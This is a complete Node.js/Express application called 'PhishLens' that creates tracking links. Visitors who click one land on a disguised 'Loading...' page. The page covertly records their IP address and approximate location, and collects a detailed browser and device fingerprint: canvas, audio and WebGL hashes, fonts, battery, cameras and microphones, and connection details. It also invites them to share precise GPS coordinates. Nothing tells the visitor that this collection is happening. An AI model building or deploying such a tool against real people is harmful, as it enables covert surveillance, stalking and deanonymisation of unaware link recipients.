const express = require('express');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const https = require('https');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json({ limit: '2mb' }));
app.use(express.static(path.join(__dirname, 'public')));

const fakeLinks = {};

// ─── IP Geolocation via ip-api.com (free, no key needed) ───
function geolocateIP(ip) {
  return new Promise((resolve) => {
    // Skip private/local IPs
    if (!ip || ip === 'Unknown' || ip.startsWith('127.') || ip.startsWith('::1') || ip.startsWith('192.168') || ip.startsWith('10.')) {
      return resolve(null);
    }
    const url = `http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting`;
    const mod = require('http');
    mod.get(url, (r) => {
      let data = '';
      r.on('data', d => data += d);
      r.on('end', () => {
        try { resolve(JSON.parse(data)); } catch { resolve(null); }
      });
    }).on('error', () => resolve(null));
  });
}

// ─── Generate link ───
app.post('/api/links', (req, res) => {
  const id = uuidv4().replace(/-/g, '').substring(0, 10);
  const baseUrl = req.headers.host || 'localhost:3000';
  const protocol = req.headers['x-forwarded-proto'] || 'http';
  const fakeUrl = `${protocol}://${baseUrl}/track/${id}`;
  fakeLinks[id] = { id, url: fakeUrl, created: new Date().toISOString(), clicks: [] };
  res.json({ success: true, link: fakeLinks[id] });
});

app.get('/api/links', (req, res) => {
  res.json(Object.values(fakeLinks).sort((a,b) => new Date(b.created) - new Date(a.created)));
});

app.get('/api/links/:id', (req, res) => {
  const link = fakeLinks[req.params.id];
  if (!link) return res.status(404).json({ error: 'Not found' });
  res.json(link);
});

// ─── Track page ───
app.get('/track/:id', (req, res) => {
  const link = fakeLinks[req.params.id];
  if (!link) return res.status(404).send('Not found');

  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
    || req.headers['x-real-ip']
    || req.socket.remoteAddress
    || 'Unknown';

  const ua = req.headers['user-agent'] || 'Unknown';
  const clickId = uuidv4();

  const click = {
    id: clickId,
    timestamp: new Date().toISOString(),
    ip,
    userAgent: ua,
    browser: parseUA(ua),
    browserVersion: parseBrowserVersion(ua),
    os: parseOS(ua),
    osVersion: parseOSVersion(ua),
    device: parseDevice(ua),
    deviceModel: parseDeviceModel(ua),
    renderingEngine: parseEngine(ua),
    referer: req.headers['referer'] || req.headers['referrer'] || 'Direct',
    acceptLanguage: req.headers['accept-language'] || 'Unknown',
    acceptEncoding: req.headers['accept-encoding'] || 'Unknown',
    dnt: req.headers['dnt'] || 'Not set',
    country: req.headers['cf-ipcountry'] || null,
    // will be filled by client + geo lookup
    geo: null,
    client: null,
  };

  link.clicks.push(click);

  // Background geo lookup
  geolocateIP(ip).then(geo => {
    if (geo && geo.status === 'success') {
      click.geo = geo;
      if (!click.country) click.country = geo.countryCode;
    }
  });

  res.send(`<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Loading...</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{background:#000;color:#fff;font-family:-apple-system,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column;gap:16px}
    .ring{width:44px;height:44px;border:2px solid #222;border-top-color:#fff;border-radius:50%;animation:spin .9s linear infinite}
    @keyframes spin{to{transform:rotate(360deg)}}
    p{color:#444;font-size:12px;font-family:monospace}
    .gps-btn{margin-top:8px;padding:10px 20px;background:#fff;color:#000;border:none;border-radius:99px;font-size:13px;cursor:pointer;font-weight:600}
  </style>
</head>
<body>
  <div class="ring"></div>
  <p id="status">Collecting data...</p>
  <button class="gps-btn" id="gpsBtn" style="display:none" onclick="requestGPS()">📍 Enable Location (optional)</button>
  <script>
  const CLICK_ID = "${clickId}";
  const LINK_ID = "${req.params.id}";

  async function collectAndSend(gpsData) {
    const nav = navigator;
    const conn = nav.connection || nav.mozConnection || nav.webkitConnection || {};
    const perf = performance || {};
    const timing = perf.timing || {};
    const entries = perf.getEntriesByType ? perf.getEntriesByType('navigation') : [];
    const navEntry = entries[0] || {};

    // Canvas fingerprint
    let canvasHash = 'N/A';
    try {
      const c = document.createElement('canvas');
      const ctx = c.getContext('2d');
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillStyle = '#f60';
      ctx.fillRect(125, 1, 62, 20);
      ctx.fillStyle = '#069';
      ctx.fillText('PhishLens 🔍', 2, 15);
      ctx.fillStyle = 'rgba(102,204,0,0.7)';
      ctx.fillText('PhishLens 🔍', 4, 17);
      const raw = c.toDataURL();
      let h = 0;
      for (let i = 0; i < raw.length; i++) { h = (Math.imul(31, h) + raw.charCodeAt(i)) | 0; }
      canvasHash = Math.abs(h).toString(16).toUpperCase();
    } catch(e) {}

    // WebGL info
    let webglVendor = 'N/A', webglRenderer = 'N/A';
    try {
      const gl = document.createElement('canvas').getContext('webgl') || document.createElement('canvas').getContext('experimental-webgl');
      if (gl) {
        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
        if (dbg) {
          webglVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
          webglRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
        }
      }
    } catch(e) {}

    // Audio fingerprint
    let audioHash = 'N/A';
    try {
      const AudioCtx = window.AudioContext || window.webkitAudioContext;
      if (AudioCtx) {
        const ctx = new AudioCtx();
        const osc = ctx.createOscillator();
        const analyser = ctx.createAnalyser();
        const gain = ctx.createGain();
        gain.gain.value = 0;
        osc.connect(analyser);
        analyser.connect(gain);
        gain.connect(ctx.destination);
        osc.start(0);
        const buf = new Float32Array(analyser.frequencyBinCount);
        analyser.getFloatFrequencyData(buf);
        osc.stop();
        ctx.close();
        let sum = 0;
        buf.slice(0, 30).forEach(v => sum += Math.abs(v));
        audioHash = sum.toFixed(6);
      }
    } catch(e) {}

    // Battery
    let battery = {};
    try {
      const b = await navigator.getBattery?.();
      if (b) battery = { level: Math.round(b.level * 100) + '%', charging: b.charging, chargingTime: b.chargingTime === Infinity ? 'N/A' : b.chargingTime + 's', dischargingTime: b.dischargingTime === Infinity ? 'N/A' : b.dischargingTime + 's' };
    } catch(e) {}

    // Fonts detection (sample)
    const testFonts = ['Arial','Helvetica','Times New Roman','Courier New','Georgia','Verdana','Comic Sans MS','Impact','Trebuchet MS','Tahoma','Palatino','Garamond','Bookman','Avant Garde','Calibri','Candara','Consolas','Franklin Gothic Medium'];
    const availableFonts = [];
    try {
      const c = document.createElement('canvas');
      const ctx = c.getContext('2d');
      testFonts.forEach(font => {
        ctx.font = '12px ' + font;
        const w1 = ctx.measureText('mmmmmmmmmmlli').width;
        ctx.font = '12px monospace';
        const w2 = ctx.measureText('mmmmmmmmmmlli').width;
        if (w1 !== w2) availableFonts.push(font);
      });
    } catch(e) {}

    // Plugins
    const plugins = [];
    try {
      for (let i = 0; i < navigator.plugins.length; i++) plugins.push(navigator.plugins[i].name);
    } catch(e) {}

    // Media devices count
    let cameras = 0, microphones = 0;
    try {
      const devices = await navigator.mediaDevices?.enumerateDevices?.();
      if (devices) {
        cameras = devices.filter(d => d.kind === 'videoinput').length;
        microphones = devices.filter(d => d.kind === 'audioinput').length;
      }
    } catch(e) {}

    // Storage estimates
    let storageUsed = 'N/A', storageTotal = 'N/A';
    try {
      const est = await navigator.storage?.estimate?.();
      if (est) {
        storageUsed = (est.usage / 1024 / 1024).toFixed(1) + ' MB';
        storageTotal = (est.quota / 1024 / 1024 / 1024).toFixed(2) + ' GB';
      }
    } catch(e) {}

    const data = {
      clickId: CLICK_ID,
      linkId: LINK_ID,

      // Browser & Display
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneOffset: new Date().getTimezoneOffset(),
      screen: screen.width + 'x' + screen.height,
      availScreen: screen.availWidth + 'x' + screen.availHeight,
      innerWindow: window.innerWidth + 'x' + window.innerHeight,
      colorDepth: screen.colorDepth,
      pixelRatio: window.devicePixelRatio,
      orientation: screen.orientation?.type || 'N/A',

      // Navigator
      platform: navigator.platform,
      languages: navigator.languages?.join(', ') || navigator.language,
      cookiesEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack,
      javaEnabled: false,
      pdfViewerEnabled: !!navigator.pdfViewerEnabled,
      serviceWorker: 'serviceWorker' in navigator,
      webGL: webglVendor !== 'N/A',

      // Hardware
      touchPoints: navigator.maxTouchPoints,
      memory: navigator.deviceMemory || 'N/A',
      cores: navigator.hardwareConcurrency || 'N/A',
      cameras, microphones,

      // Connection
      connectionType: conn.effectiveType || conn.type || 'N/A',
      downlink: conn.downlink ? conn.downlink + ' Mbps' : 'N/A',
      rtt: conn.rtt ? conn.rtt + ' ms' : 'N/A',
      saveData: conn.saveData || false,

      // Battery
      battery,

      // Storage
      storageUsed, storageTotal,

      // Fingerprints
      canvasHash,
      audioHash,
      webglVendor,
      webglRenderer,
      availableFonts: availableFonts.join(', ') || 'N/A',
      plugins: plugins.slice(0,8).join(', ') || 'None',
      fontsCount: availableFonts.length,

      // Performance
      pageLoadTime: navEntry.loadEventEnd ? Math.round(navEntry.loadEventEnd - navEntry.startTime) + 'ms' : 'N/A',

      // Location
      gps: gpsData || null,

      // Misc
      referrer: document.referrer || 'Direct',
      pageTitle: document.title,
      historyLength: window.history.length,
      onLine: navigator.onLine,
      vendor: navigator.vendor || 'N/A',
      product: navigator.product || 'N/A',
      appVersion: navigator.appVersion?.substring(0, 80) || 'N/A',
      darkMode: window.matchMedia('(prefers-color-scheme: dark)').matches,
      reducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches,
      adBlocker: false,
    };

    // Simple adblock detection
    try {
      const fakeAd = document.createElement('div');
      fakeAd.className = 'adsbox ad-banner';
      fakeAd.style.cssText = 'position:absolute;top:-999px';
      document.body.appendChild(fakeAd);
      data.adBlocker = fakeAd.offsetHeight === 0;
      document.body.removeChild(fakeAd);
    } catch(e) {}

    try {
      await fetch('/api/click-update', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });
    } catch(e) {}

    document.getElementById('status').textContent = '✓ Done.';
    document.querySelector('.ring').style.display = 'none';
  }

  function requestGPS() {
    document.getElementById('gpsBtn').textContent = '⏳ Getting location...';
    navigator.geolocation.getCurrentPosition(
      pos => {
        collectAndSend({
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          altitude: pos.coords.altitude,
          speed: pos.coords.speed,
        });
        document.getElementById('gpsBtn').style.display = 'none';
      },
      () => {
        collectAndSend(null);
        document.getElementById('gpsBtn').style.display = 'none';
      },
      { enableHighAccuracy: true, timeout: 10000 }
    );
  }

  // Show GPS button after initial collect
  setTimeout(() => {
    if (navigator.geolocation) {
      document.getElementById('gpsBtn').style.display = 'block';
    }
  }, 800);

  collectAndSend(null);
  </script>
</body>
</html>`);
});

// ─── Update click with client data ───
app.post('/api/click-update', (req, res) => {
  const { linkId, clickId, ...d } = req.body;
  const link = fakeLinks[linkId];
  if (!link) return res.json({ ok: false });
  const click = link.clicks.find(c => c.id === clickId);
  if (click) Object.assign(click, { client: d });
  res.json({ ok: true });
});

// ─── UA Parsers (enhanced) ───
function parseUA(ua) {
  if (!ua) return 'Unknown';
  if (/Edg\//.test(ua)) return 'Microsoft Edge';
  if (/YaBrowser/.test(ua)) return 'Yandex Browser';
  if (/OPR\/|Opera/.test(ua)) return 'Opera';
  if (/Brave/.test(ua)) return 'Brave';
  if (/Vivaldi/.test(ua)) return 'Vivaldi';
  if (/SamsungBrowser/.test(ua)) return 'Samsung Internet';
  if (/UCBrowser/.test(ua)) return 'UC Browser';
  if (/CriOS/.test(ua)) return 'Chrome (iOS)';
  if (/FxiOS/.test(ua)) return 'Firefox (iOS)';
  if (/Chrome\//.test(ua)) return 'Chrome';
  if (/Firefox\//.test(ua)) return 'Firefox';
  if (/Safari\//.test(ua) && !/Chrome/.test(ua)) return 'Safari';
  if (/MSIE|Trident/.test(ua)) return 'Internet Explorer';
  return 'Unknown';
}

function parseBrowserVersion(ua) {
  const m = ua.match(/(Chrome|Firefox|Safari|Edg|OPR|Version)\/([0-9.]+)/);
  return m ? m[2].split('.')[0] : 'N/A';
}

function parseOS(ua) {
  if (!ua) return 'Unknown';
  if (/Windows NT 10\.0.*Win64/.test(ua)) return 'Windows 11/10';
  if (/Windows NT 10/.test(ua)) return 'Windows 10';
  if (/Windows NT 6\.3/.test(ua)) return 'Windows 8.1';
  if (/Windows NT 6\.2/.test(ua)) return 'Windows 8';
  if (/Windows NT 6\.1/.test(ua)) return 'Windows 7';
  if (/Windows/.test(ua)) return 'Windows';
  if (/Mac OS X/.test(ua)) return 'macOS';
  if (/iPhone/.test(ua)) return 'iOS';
  if (/iPad/.test(ua)) return 'iPadOS';
  if (/Android/.test(ua)) return 'Android';
  if (/Linux/.test(ua)) return 'Linux';
  if (/CrOS/.test(ua)) return 'ChromeOS';
  return 'Unknown';
}

function parseOSVersion(ua) {
  const mac = ua.match(/Mac OS X ([0-9_]+)/);
  if (mac) return mac[1].replace(/_/g, '.');
  const android = ua.match(/Android ([0-9.]+)/);
  if (android) return android[1];
  const ios = ua.match(/OS ([0-9_]+) like/);
  if (ios) return ios[1].replace(/_/g, '.');
  const win = ua.match(/Windows NT ([0-9.]+)/);
  if (win) return win[1];
  return 'N/A';
}

function parseDevice(ua) {
  if (!ua) return 'Unknown';
  if (/iPhone/.test(ua)) return 'iPhone';
  if (/iPad/.test(ua)) return 'iPad';
  if (/Android/.test(ua) && /Mobile/.test(ua)) return 'Android Phone';
  if (/Android/.test(ua)) return 'Android Tablet';
  if (/CrOS/.test(ua)) return 'Chromebook';
  return 'Desktop / Laptop';
}

function parseDeviceModel(ua) {
  const m = ua.match(/\(([^)]+)\)/);
  if (!m) return 'N/A';
  return m[1].split(';')[0].trim().substring(0, 60);
}

function parseEngine(ua) {
  if (/Gecko\//.test(ua) && !/like Gecko/.test(ua)) return 'Gecko';
  if (/WebKit\//.test(ua) && !/Chrome/.test(ua)) return 'WebKit';
  if (/Blink/.test(ua) || /Chrome\//.test(ua)) return 'Blink';
  if (/Trident/.test(ua)) return 'Trident';
  if (/like Gecko/.test(ua)) return 'WebKit/Blink';
  return 'Unknown';
}

app.listen(PORT, () => console.log(`🚀 PhishLens running on :${PORT}`));
